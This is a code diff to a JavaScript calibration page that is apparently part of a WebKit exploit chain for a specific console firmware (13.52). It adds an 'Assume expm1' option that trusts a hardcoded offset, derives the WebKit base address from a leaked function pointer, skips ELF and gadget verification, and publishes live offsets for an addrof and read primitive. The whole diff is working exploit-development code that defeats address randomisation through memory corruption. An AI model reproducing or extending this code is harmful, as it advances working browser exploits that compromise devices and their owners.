@@ -17,6 +17,11 @@ let lengthMissStreak = 0;
 const LOG_MAX = 300;
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
+/** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
+const ASSUMED_EXPM1 = parseInt(
+    (params.get("expm1") || "2582880").replace(/^0x/i, ""),
+    16
+);
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
 
 const GADGET_CHECKS = [
@@ -94,7 +99,7 @@ function wireGroomBar() {
 }
 
 let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In, baseIn;
-let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
+let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnAssume, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
 let calBarEl;
 let scanMode = "lite";
 let scanIndex = 0;
@@ -142,6 +147,7 @@ function setUi() {
     setCalButton(btnVerify, calReady);
     setCalButton(btnSetExpm1, calReady);
     setCalButton(btnSetBase, calReady);
+    setCalButton(btnAssume, calReady);
     setCalButton(btnVerify2, calReady);
     setCalButton(btnSetExpm12, calReady);
     setCalButton(btnSetBase2, calReady);
@@ -326,11 +332,11 @@ function suggestedExpm1(fn, off) {
 }
 
 function prefillSuggestedExpm1(fn, off) {
-    const guess = suggestedExpm1(fn, off);
+    const guess = ASSUMED_EXPM1 > 0 ? ASSUMED_EXPM1 : suggestedExpm1(fn, off);
     if (!(guess > 0)) return 0;
     if (expm1In) expm1In.value = guess.toString(16);
     mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + baseFromDelta(fn, guess)
-        + " (guess only — use Probe ELF if verify fails)");
+        + " (assumed — tap Assume to skip verify, or Verify step to check)");
     updateResultPanel();
     return guess;
 }
@@ -377,6 +383,7 @@ function updateResultPanel() {
             return;
         }
         resultEl.textContent = [
+            (calibrated.assumed ? "ASSUMED (not verified)\n" : ""),
             "expm1=0x" + calibrated.delta.toString(16),
             "webkit=" + calibrated.webkitBase,
             calibrated.libkernelBase ? "libkernel=" + calibrated.libkernelBase : "libkernel=(IAT not verified)",
@@ -403,7 +410,8 @@ function checkGadgetBytes(p, base, rva, pat) {
     return true;
 }
 
-function applyCalibration(delta, base, libkernelBase, gadgetOk) {
+function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
+    const assumed = opts && opts.assumed;
     const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base);
     if (!(useDelta > 0)) {
         mark("CAL-FAIL", "no expm1 delta for PASTE-OFFSETS");
@@ -413,16 +421,19 @@ function applyCalibration(delta, base, libkernelBase, gadgetOk) {
         delta: useDelta,
         webkitBase: base,
         libkernelBase: libkernelBase || null,
-        elf: true,
+        elf: assumed ? null : true,
         gadgetOk: gadgetOk || 0,
         gadgetTotal: GADGET_CHECKS.length,
         ok: true,
+        assumed: !!assumed,
     };
     calibrated = result;
     clearVerifyProgress();
     clearLkProgress();
     const live = {
-        fw_status: "calibrated on hardware (index_cal.html)",
+        fw_status: assumed
+            ? "assumed expm1 on hardware — not ELF/gadget verified"
+            : "calibrated on hardware (index_cal.html)",
         wk_JSFunction_m_function: tableOff.wk_JSFunction_m_function || 0x28,
         wk_expm1_builtin: result.delta,
         wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
@@ -442,7 +453,8 @@ function applyCalibration(delta, base, libkernelBase, gadgetOk) {
         sessionStorage.removeItem("wk-cal-wide-i");
     } catch (_) { }
 
-    mark("CAL-OK", "expm1=0x" + result.delta.toString(16) + " base=" + result.webkitBase);
+    mark("CAL-OK", (assumed ? "ASSUMED " : "")
+        + "expm1=0x" + result.delta.toString(16) + " base=" + result.webkitBase);
     mark("BASES", "webkit=" + result.webkitBase
         + (result.libkernelBase ? " libkernel=" + result.libkernelBase : ""));
     mark("PASTE-OFFSETS", JSON.stringify(live, null, 2));
@@ -578,21 +590,23 @@ async function runStart() {
         manualBase = loadManualBaseOverride();
         if (manualBase) {
             if (baseIn) baseIn.value = ptrNum(manualBase).toString(16);
-            const implied = impliedExpm1FromBase(nativeFn, manualBase);
-            if (implied > 0 && expm1In) expm1In.value = implied.toString(16);
-            mark("CAL-BASE-LOAD", "manual base=" + manualBase
-                + (implied > 0 ? " expm1=0x" + implied.toString(16) : ""));
+            mark("CAL-BASE-LOAD", "manual base=" + manualBase + " (expm1 field unchanged)");
         }
 
-        mark("HINT-CAL", "lite scan optional — Set expm1 or Set base needs 0 reads");
+        if (params.get("trust") === "1" || params.get("assume") === "1") {
+            runAssumeTest(true);
+            return;
+        }
+
+        mark("HINT-CAL", "tap Assume expm1 to test with 0x2582880 — no verify reads");
         prefillSuggestedExpm1(nativeFn, tableOff);
 
         const pre = parseExpm1(params.get("expm1"));
         if (pre > 0 && expm1In) expm1In.value = pre.toString(16);
 
         updateResultPanel();
-        mark("NEXT", "type 2582880 → tap Set expm1 (toolbar or sticky bar below)");
-        state("primitive OK — Set expm1 enabled in toolbar", "ok");
+        mark("NEXT", "tap Assume expm1 (test) OR Verify step");
+        state("primitive OK — Assume or Verify", "ok");
         try { if (expm1In) expm1In.focus(); } catch (_) { }
         if (calBarEl && calBarEl.scrollIntoView)
             try { calBarEl.scrollIntoView(false); } catch (_) { }
@@ -706,20 +720,43 @@ function runSetBase() {
         sessionStorage.setItem(SS_MANUAL_BASE, String(base));
     } catch (_) { }
 
-    const delta = impliedExpm1FromBase(nativeFn, base);
-    if (delta > 0) {
-        try { sessionStorage.setItem(SS_CANDIDATE, delta.toString(16)); } catch (_) { }
-        if (expm1In) expm1In.value = delta.toString(16);
-        mark("CAL-IMPLIED", "expm1=0x" + delta.toString(16) + " (= nativeFn − base)");
-    } else {
-        mark("CAL-WARN", "could not derive expm1 from nativeFn − base");
-    }
-
     clearVerifyProgress();
     updateResultPanel();
-    mark("CAL-SET-BASE", "base=" + base + " (manual, 0 reads)");
-    mark("HINT", "tap Verify step — uses manual base, not expm1 math");
+    mark("CAL-SET-BASE", "base=" + base + " (manual, 0 reads — expm1 unchanged)");
+    mark("HINT", "tap Assume expm1 OR Verify step (uses this base if Set base was last)");
     state("base set (0 reads)", "ok");
+}
+
+function runAssumeTest(fromStart) {
+    if (!fromStart) {
+        if (busy || !ready || !nativeFn) return;
+        preCalTrim();
+    }
+    const delta = parseExpm1(expm1In && expm1In.value) || ASSUMED_EXPM1;
+    if (!(delta > 0)) {
+        mark("CAL-FAIL", "bad expm1");
+        state("invalid expm1", "bad");
+        return;
+    }
+    const base = manualBase || baseFromDelta(nativeFn, delta);
+    if (!base) {
+        mark("CAL-FAIL", "cannot compute base");
+        return;
+    }
+    if (expm1In) expm1In.value = delta.toString(16);
+    if (baseIn) baseIn.value = ptrNum(base).toString(16);
+    try { sessionStorage.setItem(SS_CANDIDATE, delta.toString(16)); } catch (_) { }
+
+    if (window.p) {
+        const magic = read4p(window.p, base);
+        mark("CAL-ELF-PEEK", "read4@base=" + base + " got=" + fmtMagic(magic)
+            + " (info only — 0x464c457f = ELF header, not an input value)");
+    }
+
+    applyCalibration(delta, base, null, 0, { assumed: true });
+    mark("HINT", "offsets live — use index_rw.html to peek webkitBase, or paste JSON");
+    state("CAL-OK assumed — ready to test", "ok");
+    setUi();
 }
 
 async function runProbeElf() {
@@ -831,7 +868,8 @@ async function runVerifyStep() {
                 clearVerifyProgress();
                 mark("CAL-FAIL", "ELF @ base=" + base + " got=" + fmtMagic(magic)
                     + " want=0x464c457f");
-                mark("HINT", "2582880 is a guess — tap 2c. Probe ELF (1 read/tap) to hunt real expm1");
+                mark("HINT", "0x464c457f is what a READ returns at base — do not type it into expm1/base");
+                mark("HINT", "tap Assume expm1 to skip verify and test with 0x2582880 anyway");
                 const atGuess = read4p(p, baseFromDelta(nativeFn, suggestedExpm1(nativeFn, tableOff)));
                 if (atGuess != null)
                     mark("HINT", "table-hint base got=" + fmtMagic(atGuess));
@@ -997,6 +1035,7 @@ function init() {
     btnVerify = $("btn-verify");
     btnSetExpm1 = $("btn-set-expm1");
     btnSetBase = $("btn-set-base");
+    btnAssume = $("btn-assume");
     btnVerify2 = $("btn-verify-2");
     btnSetExpm12 = $("btn-set-expm1-2");
     btnSetBase2 = $("btn-set-base-2");
@@ -1019,6 +1058,7 @@ function init() {
     wireClick(btnSetExpm12, runSetExpm1);
     wireClick(btnSetBase, runSetBase);
     wireClick(btnSetBase2, runSetBase);
+    wireClick(btnAssume, function () { runAssumeTest(false); });
     wireClick(btnProbe, function () { return runProbeElf(); });
     wireClick(btnCopy, runCopy);
     wireClick(btnClear, function () {
@@ -1036,6 +1076,7 @@ function init() {
 
     const pre = params.get("expm1");
     if (pre && expm1In) expm1In.value = pre.replace(/^0x/i, "");
+    else if (expm1In) expm1In.value = ASSUMED_EXPM1.toString(16);
 
     const preBase = params.get("base");
     if (preBase && baseIn) {
@@ -1048,7 +1089,7 @@ function init() {
 
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "Set base = manual webkitBase override (?base=8325b0000)");
+    mark("BOOT", "Assume expm1 = trust 0x2582880 (?trust=1 auto after Start)");
     wireGroomBar();
     setUi();
     state("ready — pick groom if needed, then Start", "");
